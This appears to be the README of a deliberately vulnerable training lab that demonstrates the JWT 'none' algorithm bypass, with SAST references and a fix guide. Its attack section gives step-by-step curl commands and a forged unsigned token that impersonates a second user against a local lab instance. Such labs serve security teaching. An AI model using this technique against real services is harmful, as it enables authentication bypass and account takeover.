# Python-JWT-Hs256-None

JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA.

https://jwt.io/

## Owasp

https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.md


## SAST Tools : 

Find With SAST Tools : SonarQube Develpoer Plan


![Getting Started](22.png)



Find With SAST Tools : My Yml Script


![Getting Started](21.png)



## Setup

install from my dockerhub : https://hub.docker.com/r/mhnamadi/jwt-none


    docker run -ti -p 8008:5000 mhnamadi/jwt-none


## Payload 

* `curl --header "Content-Type: application/json" --request POST --data '{"username":"admin","password":"admin"}' http://localhost:5000/auth`


* `curl -i -H "Accept: application/json" -H "Authorization: JWT " http://localhost:5000/protected`

* `Null cipher header: eyJ0eXAiOiJKV1QiLCAiYWxnIjoiTk9ORSJ9.`

## Attack

1. Frist you should find to a valid JWT token. you can do this by run following command :
```
curl --header "Content-Type: application/json" --request POST --data '{"username":"user","password":"user"}' http://localhost:8008/auth
```

2. In response you will get something like this :
```
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDQ4NTQyODUsImlhdCI6MTY0NDg1Mzk4NSwibmJmIjoxNjQ0ODUzOTg1LCJpZGVudGl0eSI6MX0.mBCLVmIjOQT4a596r7sHvKgPm60ZgZjXBzSGZPKLRp0"
  }
```

3. Now to check JWT token simply run following command . You shouldn't get 401 in response
```
 curl -i -H "Accept: application/json" -H "Authorization: <access_token> " http://localhost:8008/protected
```

4. We want gain access  to the application as the second user. to this this first of all we need to decode the body of JWT to see which parameters are peresent. we can do this with any base64 decoder. you can do this with python or simply run this command:
```
echo eyJleHAiOjE2NDQ4NTQyODUsImlhdCI6MTY0NDg1Mzk4NSwibmJmIjoxNjQ0ODUzOTg1LCJpZGVudGl0eSI6MX0= | base64 --decode
```

5. In the decode body change `"identity": 1` to `"identity" : 2` and encode it to base64 again
6. Now we must change algorithm to none . to do this decode the header too and change value of algorithm to none then encode it to base64.
7. Remove signiture part, but remember keep the trailing `.`. The final token should be something like this:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K.eyJleHAiOjE2NDQ4NTQyODUsImlhdCI6MTY0NDg1Mzk4NSwibmJmIjoxNjQ0ODUzOTg1LCJpZGVudGl0eSI6Mn0K.
```

8. Now send request in the step 3 but use your JWT token from step 7 . Congrats, you are user2.

![Getting Started](12.png)

## Fix Guide :  

https://curity.io/resources/learn/jwt-best-practices/


## Contributing : 
 
We encourage you to contribute to Project


## Twitter Contributor :

   https://twitter.com/siavashvafshar
   
   
## Relevant reports and write-ups

   1. https://infosecwriteups.com/idor-in-jwt-and-the-shortest-token-you-will-ever-see-uid-1234567890-4e02377ea03a
   2. https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771